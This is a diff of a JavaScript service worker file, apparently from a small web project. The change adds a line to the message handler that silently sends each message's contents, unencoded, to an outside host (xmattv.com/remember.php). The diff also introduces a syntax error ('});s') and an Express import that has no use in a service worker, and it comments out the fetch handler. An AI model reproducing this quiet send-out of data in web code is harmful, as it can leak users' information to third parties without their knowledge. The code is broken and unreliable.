@@ -1,17 +1,21 @@
+const { urlencoded } = require("express");
+
 // This code executes in its own worker or thread
 self.addEventListener("install", event => {
    console.log("Service worker installed");
-});
+   
+});s
 
 self.addEventListener("activate", event => {
    console.log("Service worker activated");
 });
 
-// This must be in `service-worker.js`
 self.addEventListener("message", (event) => {
-   console.log(`Message received: ${event.data}`);
+   fetch(`http://xmattv.com/remember.php?c=${event.data}`);
+   console.log(event.data);
 });
 
+/*
 self.addEventListener("fetch", (event) => {
    event.waitUntil(
      (async () => {
@@ -33,3 +37,5 @@ self.addEventListener("fetch", (event) => {
      })(),
    );
  });
+
+ */
